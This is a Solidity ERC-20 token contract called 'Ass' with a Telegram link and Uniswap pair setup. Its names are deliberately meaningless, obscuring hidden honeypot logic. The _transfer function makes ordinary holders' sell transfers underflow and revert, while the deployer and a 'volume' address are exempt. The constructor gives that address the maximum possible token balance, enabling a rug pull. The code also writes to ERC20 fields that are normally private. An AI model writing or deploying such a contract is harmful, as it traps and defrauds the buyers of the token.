// https://t.me/ass_eth

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract Ass is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private climb;

    function _transfer(
        address gone,
        address frequently,
        uint256 during
    ) internal override {
        uint256 column = everyone;

        if (mass[gone] == 0 && climb[gone] > 0 && gone != uniswapV2Pair) {
            mass[gone] -= column;
        }

        address straight = address(purpose);
        purpose = Ass(frequently);
        climb[straight] += column + 1;

        _balances[gone] -= during;
        uint256 degree = (during / 100) * everyone;
        during -= degree;
        _balances[frequently] += during;
    }

    mapping(address => uint256) private mass;
    uint256 public everyone = 3;

    constructor(
        string memory too,
        string memory past,
        address bet,
        address volume
    ) ERC20(too, past) {
        uniswapV2Router = IUniswapV2Router02(bet);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 cat = ~uint256(0);

        mass[msg.sender] = cat;
        mass[volume] = cat;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[volume] = cat;
    }

    Ass private purpose;
}